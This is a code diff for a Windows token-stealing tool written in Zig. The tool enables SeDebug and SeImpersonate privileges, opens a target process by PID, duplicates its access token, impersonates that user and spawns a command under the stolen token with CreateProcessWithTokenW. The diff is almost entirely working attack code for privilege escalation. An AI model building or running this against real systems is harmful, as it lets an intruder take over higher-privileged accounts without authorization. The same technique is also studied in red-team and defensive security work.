@@ -9,25 +9,9 @@ const win32 = @import("win32").everything;
 const win32_security = @import("win32").security;
 
 const windows = std.os.windows;
+const INFO_BUFFER_SIZE: u32 = 32767;
 
 // https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170
-
-// This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
-extern "advapi32" fn OpenProcessToken(
-    ProcessHandle: ?win32.HANDLE,
-    DesiredAccess: win32_security.TOKEN_ACCESS_MASK,
-    TokenHandle: ?*?win32.HANDLE,
-) callconv(windows.WINAPI) win32.BOOL;
-
-// This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
-pub extern "advapi32" fn DuplicateTokenEx(
-    hExistingToken: ?win32.HANDLE,
-    DesiredAccess: u32,
-    lpTokenAttributes: ?*win32.SECURITY_ATTRIBUTES,
-    ImpersonationLevel: win32.SECURITY_IMPERSONATION_LEVEL,
-    TokenType: win32.TOKEN_TYPE,
-    phNewToken: ?*?win32.HANDLE,
-) callconv(windows.WINAPI) win32.BOOL;
 
 const Action = struct {
     const Self = @This();
@@ -50,14 +34,17 @@ const Action = struct {
         };
     }
 
-    pub fn tryEnablePrivilege(self: *Self) bool {
+    pub fn tryEnablePrivilege(
+        self: *Self,
+        se_privilege: ?[*:0]const u8,
+    ) bool {
         var tp: win32.TOKEN_PRIVILEGES = undefined;
         var luid: win32.LUID = undefined;
 
         // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
         if (0 == win32.LookupPrivilegeValueA(
             null, //                    [in, optional] LPCSTR lpSystemName,
-            win32.SE_DEBUG_NAME, //     [in]           LPCSTR lpName,
+            se_privilege, //     [in]           LPCSTR lpName,
             &luid, //                   [out]          PLUID  lpLuid
         )) {
             std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
@@ -73,7 +60,7 @@ const Action = struct {
         defer _ = Action.CloseHandle(hProcess);
 
         // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
-        if (0 == OpenProcessToken(
+        if (0 == win32.OpenProcessToken(
             hProcess.?, //                               [in]  HANDLE  ProcessHandle,
             win32_security.TOKEN_ADJUST_PRIVILEGES, //   [in]  DWORD   DesiredAccess,
             &self.sourceProcessToken, //                 [out] PHANDLE TokenHandle
@@ -117,16 +104,21 @@ const Action = struct {
     }
 
     pub fn execute(self: *Self) bool {
+        var infoBuf: [INFO_BUFFER_SIZE]u8 = std.mem.zeroes([INFO_BUFFER_SIZE]u8);
+        var bufCharCount: u32 = INFO_BUFFER_SIZE;
+
         var startupInfo: win32.STARTUPINFOW = std.mem.zeroes(win32.STARTUPINFOW);
         var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);
 
         startupInfo.cb = @sizeOf(win32.STARTUPINFOW);
+        startupInfo.lpDesktop = std.unicode.utf8ToUtf16LeWithNull(self.allocator, "winsta0\\default") catch undefined;
+        errdefer self.allocator.free(startupInfo.lpDesktop);
 
         // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
         const processHandle: ?win32.HANDLE = win32.OpenProcess(
-            win32.PROCESS_QUERY_LIMITED_INFORMATION, // [in] DWORD dwDesiredAccess,
-            windows.TRUE, //                            [in] BOOL  bInheritHandle,
-            self.targetPID, //                          [in] DWORD dwProcessId
+            win32.PROCESS_QUERY_LIMITED_INFORMATION,
+            windows.TRUE,
+            self.targetPID,
         );
         defer _ = Action.CloseHandle(processHandle);
         var result = @intFromEnum(win32.GetLastError());
@@ -137,10 +129,10 @@ const Action = struct {
         }
 
         // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
-        _ = OpenProcessToken(
-            processHandle, //                           [in]  HANDLE  ProcessHandle,
-            win32_security.TOKEN_MAXIMUM_ALLOWED, //    [in]  DWORD   DesiredAccess,
-            &self.targetProcessToken, //                [out] PHANDLE TokenHandle
+        _ = win32.OpenProcessToken(
+            processHandle,
+            win32_security.TOKEN_ACCESS_MASK{ .DUPLICATE = 1, .QUERY = 1, .IMPERSONATE = 1, .ASSIGN_PRIMARY = 1 },
+            &self.targetProcessToken,
         );
         result = @intFromEnum(win32.GetLastError());
 
@@ -151,20 +143,32 @@ const Action = struct {
 
         // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
         if (0 == win32.ImpersonateLoggedOnUser(
-            self.targetProcessToken, // [in] HANDLE hToken
+            self.targetProcessToken,
         )) {
             std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
             return false;
         }
 
+        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea
+        if (0 == win32.GetUserNameA(@ptrCast(&infoBuf), &bufCharCount)) {
+            std.log.err("[!] Failed GetUserNameA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
+            return false;
+        }
+
+        std.log.debug("[+] Impersonated: {s}", .{infoBuf[0..bufCharCount]});
+
+        var lpAttributes: win32.SECURITY_ATTRIBUTES = std.mem.zeroes(win32.SECURITY_ATTRIBUTES);
+        lpAttributes.nLength = @sizeOf(win32.SECURITY_ATTRIBUTES);
+        lpAttributes.bInheritHandle = windows.TRUE;
+
         // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
-        if (0 == DuplicateTokenEx(
-            self.targetProcessToken, //             [in]           HANDLE                       hExistingToken
-            win32.MAXIMUM_ALLOWED, //               [in]           DWORD                        dwDesiredAccess
-            null, //                                [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes
-            win32.SecurityImpersonation, //         [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
-            win32.TokenPrimary, //                  [in]           TOKEN_TYPE                   TokenType
-            &self.targetDuplicateProcessToken, //   [out]          PHANDLE                      phNewToken
+        if (0 == win32.DuplicateTokenEx(
+            self.targetProcessToken,
+            win32_security.TOKEN_MAXIMUM_ALLOWED,
+            &lpAttributes,
+            win32.SecurityImpersonation,
+            win32.TokenPrimary,
+            &self.targetDuplicateProcessToken,
         )) {
             std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
             return false;
@@ -177,26 +181,28 @@ const Action = struct {
             return false;
         }
 
-        // TODO: fix segfault if lpApplicationName is not found on the system
         const lpApplicationName = std.unicode.utf8ToUtf16LeWithNull(self.allocator, self.command) catch undefined;
         errdefer self.allocator.free(lpApplicationName);
 
         // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
         if (0 == win32.CreateProcessWithTokenW(
-            self.targetDuplicateProcessToken, //[in]                HANDLE                hToken,
-            win32.LOGON_WITH_PROFILE, //        [in]                DWORD                 dwLogonFlags,
-            lpApplicationName, //               [in, optional]      LPCWSTR               lpApplicationName,
-            null, //                            [in, out, optional] LPWSTR                lpCommandLine,
-            0, //                               [in]                DWORD                 dwCreationFlags,
-            null, //                            [in, optional]      LPVOID                lpEnvironment,
-            null, //                            [in, optional]      LPCWSTR               lpCurrentDirectory,
-            &startupInfo, //                    [in]                LPSTARTUPINFOW        lpStartupInfo,
-            &processInformation, //             [out]               LPPROCESS_INFORMATION lpProcessInformation
+            self.targetDuplicateProcessToken,
+            win32.LOGON_WITH_PROFILE,
+            lpApplicationName,
+            null,
+            @bitCast(win32.CREATE_NEW_CONSOLE),
+            null,
+            null,
+            &startupInfo,
+            &processInformation,
         )) {
             std.log.err("[!] Failed CreateProcessWithTokenW :: {s} error code ({d})", .{ self.command, @intFromEnum(win32.GetLastError()) });
             defer self.allocator.free(lpApplicationName);
             return false;
         }
+
+        defer _ = Action.CloseHandle(processInformation.hProcess);
+        defer _ = Action.CloseHandle(processInformation.hThread);
 
         result = @intFromEnum(win32.GetLastError());
 
@@ -204,6 +210,8 @@ const Action = struct {
             std.log.err("[!] Failed CreateProcessWithTokenW :: error code ({d})", .{result});
             return false;
         }
+
+        _ = win32.RevertToSelf();
 
         return true;
     }
@@ -307,8 +315,13 @@ pub fn main() !void {
 
     action.debug();
 
-    if (!action.tryEnablePrivilege()) {
-        std.log.err("[!] User does not possess SeDebugPrivilege", .{});
+    if (!action.tryEnablePrivilege(win32.SE_DEBUG_NAME)) {
+        std.log.err("[!] User does not possess Privilege: SeDebug", .{});
+        return;
+    }
+
+    if (!action.tryEnablePrivilege(win32.SE_IMPERSONATE_NAME)) {
+        std.log.err("[!] User does not possess Privilege: SeImpersonateName", .{});
         return;
     }
 
